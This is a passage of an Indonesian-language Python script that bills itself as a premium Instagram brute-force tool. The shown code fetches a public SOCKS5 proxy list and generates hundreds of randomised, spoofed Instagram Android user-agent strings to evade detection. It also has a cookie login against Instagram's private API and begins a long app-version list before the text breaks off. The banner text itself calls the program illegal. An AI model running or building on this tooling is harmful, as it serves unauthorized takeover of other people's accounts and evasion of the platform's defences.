# coding:utf-8
#!/usr/bin/python3
# Made With 💙 By Sora
try:
    import json
    import uuid
    import hmac
    import rich
    import random
    import hashlib
    import urllib
    import urllib.request
    import calendar
    import string
    import requests
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import os,sys,random,datetime,time,re,string
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
hapus  = '[/]'
biru_m = '[bold cyan]'

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

color_table = "#FFFFFF"
color_rich = "[#00C8FF]"

try:os.mkdir('data')
except:pass
try:os.mkdir('result')
except:pass

CY='\033[96;1m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
C='\033[0m' #CLEAR

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
R2 = random.choice([A2,H2,J2,K2,M2,N2,B2])

USN="Instagram  Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 278.0.0.21.117 Android (33/13; 4800; 1080x2176; samsung; SM-G991B; o1s; exynos2100; it_IT; 464315251)"

try:
	link = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt").text
	open('.prox.txt','w').write(link)
except:pass
prox=open('.prox.txt','r').read().splitlines()

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
SORA={}
SORA1={}
method=[]
s=requests.Session()
baru=[]
zx=[]
prox=[]
rey_save_data = []

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    a = f"Instagram  U; Android {str(rr(9,12))}; ru-ru; POCO X4 Pro 5G Build/SKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.16.1-gn"
    b = f"Instagram  Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.0.0 Mobile Safari/537.36"
    c = f"Instagram  U; Android {str(rr(7,12))}; en-US; TFY-LX1 Build/HONORTFY-L31CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} UCBrowser/13.4.0.1306 Mobile Safari/537.36"
    d = f"Instagram  Android 10; M2006C3LII Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,272))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/10; 3200; 720x1449; Xiaomi/Redmi; M2006C3LII; dandelion; mt6762; en_GB; {str(rr(422222222,499999999))})"
    f = f"Instagram  Android {str(rr(9,12))}; DN2101 Build/RP1A.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (30/{str(rr(9,12))}; 4800; 1080x2293; OnePlus; DN2101; OP515BL1; mt6893; es_LA; {str(rr(422222222,499999999))})"
    g= f"Instagram  Android {str(rr(9,12))}; Redmi Note 8T Build/PKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (28/{str(rr(9,12))}; 4400; 1080x2130; Xiaomi/xiaomi; Redmi Note 8T; willow; qcom; en_US; {str(rr(422222222,499999999))})"
    h= f"Instagram  Android 13; M2102J22G Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (33/{str(rr(9,12))}; 4800; 1080x2167; Xiaomi/POCO; M2102J20SG; vayu; qcom; en_US; {str(rr(422222222,499999999))})"
    i= f"Instagram  Android {str(rr(9,13))}; SM-A205G Build/RP1A.{str(rr(111111,199999))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (30/{str(rr(9,12))}; 3200; 720x1459; 2800; 720x1423; samsung; SM-A205G; a20; exynos7884B; pt_BR; {str(rr(422222222,499999999))})"
    j= f"Instagram  Android {str(rr(9,13))}; Redmi Note 7 Build/QKQ1.{str(rr(111111,199999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/{str(rr(9,12))}; 4400; 1080x2131; Xiaomi/xiaomi; Redmi Note 7; lavender; qcom; pt_BR; {str(rr(422222222,499999999))})"
    k= f"Instagram  Android {str(rr(9,13))}; SM-G9910 Build/TP1A.{str(rr(211111,299999))}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,140))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,90))}.{str(rr(111,199))} Android (33/{str(rr(9,12))}; 4800; 1080x2176; samsung; SM-G9910; o1q; qcom; en_US; {str(rr(411111111,499999999))})"
    l= f"Instagram  Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/{str(rr(9,12))}; 4400; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; en_GB; {str(rr(422222222,499999999))})"
    m= f"Instagram  Android {str(rr(9,12))}; CPH2305 Build/SKQ1.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (33/{str(rr(9,12))}; 4800; 1080x2268; OPPO; CPH2305; OP52D1L1; qcom; en_GB; {str(rr(422222222,499999999))})"
    n= f"Instagram  Android 9; 5048U_EEA Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (28/9; 3200; 720x1460; TCL; 5048U_EEA; Venice; mt6763; en_US; {str(rr(422222222,499999999))})"
    o= f"Instagram  Android {str(rr(9,12))}; V2111 Build/SP1A.{str(rr(111111,199999))}.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,13))}; 3000; 720x1554; vivo; V2111; 2111; mt6765; en_US; {str(rr(422222222,499999999))})"
    p= f"Instagram  Android 13; I2011 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (28/{str(rr(9,13))}; 4400; 1080x2276; vivo/iQOO; I2011; 2011; qcom; en_US; {str(rr(422222222,499999999))})"
    q= f"Instagram  Android {str(rr(9,12))}; SM-G991U1 Build/TP1A.{str(rr(111111,199999))}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (33/{str(rr(9,12))}; 4800; 1080x2176; samsung; SM-G991U1; o1q; qcom; en_US; {str(rr(422222222,499999999))})"
    r= f"Instagram  Android {str(rr(9,12))}; GM1917 Build/QKQ1.{str(rr(111111,199999))}.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/{str(rr(9,12))}; 5600; 1440x3120; OnePlus; GM1917; OnePlus7Pro; qcom; en_US; {str(rr(422222222,499999999))})"
    uainsta = str(rc([a, b, c ,d ,f ,g,h,i,j,k,l,m,n,o,p,q,r]))
    baru.append(uainsta)


def clear():
    try:os.system('clear')
    except:pass

def RemoveCookie():
    try:os.remove("data/cookie.txt")
    except:pass
    try:os.remove("data/user.txt")
    except:pass

def waktu():
    now = datetime.now()
    hours = now.hour
    if 4 <= hours < 12:timenow = "Good Morning"
    elif 12 <= hours < 15:timenow = "Good Afternoon"
    elif 15 <= hours < 18:timenow = "Good Evening"
    else:timenow = "Good Night"
    return timenow

def jalan(keliling):
    for mau in keliling + '\n':
        sys.stdout.write(mau)
        sys.stdout.flush();sleep(0.03) 

def banner():
    clear();cetak(nel(f'''{R2}
_________________________________________ 
__  ___/__  __ \__  ____/__  ____/__  __ \
_____ \__  /_/ /_  __/  __  __/  __  / / /
____/ /_  ____/_  /___  _  /___  _  /_/ / 
/____/ /_/     /_____/  /_____/  /_____/  

{M2}•{K2}•{H2}•{O2} BRUTE FORCE INSTAGRAM🔥 {H2}•{K2}•{M2}•{R2}
                      ''', style='purple ',
 title=f'{M2}•{H2} PREMIUM TOOLS {M2}•{P2}', subtitle=f'• {P2}{waktu()}{U2} •'))

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{P}[{B}+{P}] MOHON TUNGGU... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")        

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user=open('data/user.txt','r').read()
    coki = open('data/cookie.txt','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('data/cookie.txt')
    except  (ValueError,KeyError):
        print(f"{P}[{B}+{P}] Instagram checkpoint")
        os.remove('data/cookie.txt')
        os.remove('data/user.txt')
        exit()

    return external,user

def login_kamu():
        try:
            kuki=open('data/cookie.txt','r').read()
        except FileNotFoundError:
            banner()
            __soraa__ ='[white][[cyan]•>[white]] [green]Disarankan Login Menggunakan [red1]Cookies!!\n[white][[cyan]•>[white]] [green]Program Ini Bersifat Ilegal. Gunakanlah Dengan Bijak, Atas Apapun Yang Terjadi Pada Kalian Saya Tidak Bertanggung Jawab. Dilarang Keras Menggunakan Script ini Secara Berlebihan!\n[white][[cyan]•>[white]] [green]Disarankan Menggunakan Ekstensi Cookie dough Melalui Kiwi [red1]Browser!![white]'
            cetak(nel(__soraa__, style='purple '))
            coki = input(f"{P}[{B}?{P}] Masukan Cookie : {H}")
            loading()
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)['user']
                useri = xx["username"]
                user = open('data/user.txt','w').write(useri)
                kuki = open('data/cookie.txt','w').write(coki)
                jalan(f'{P}[{H}✓{P}] selamat datang {H}{useri}{P} cookie kamu valid')
                time.sleep(3)
            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
                jalan(f"{P}[{M}!{P}] cookie invalid silahkan masukan cookie lainnya")
                time.sleep(3)
                RemoveCookie()
                exit()
            except ConnectionAbortedError:
                print(f"")
        ex,user=cekAPI(kuki)
        cookie=kuki
        instagram(ex,user,cookie).menu()

def User_Agent():
    dpi_phone = [
        '133','320','515','160','640','240','120'
        '800','480','225','768','216','1024']
    model_phone = [
        'Nokia 2.7','HUAWEI','Galaxy',
        'Unlocked Smartphones','Nexus 6P',
        'Mobile Phones','Xiaomi',
        'samsung','OnePlus']
    pxl_phone = [
        '720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733']
    i_version = [
        '11442.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.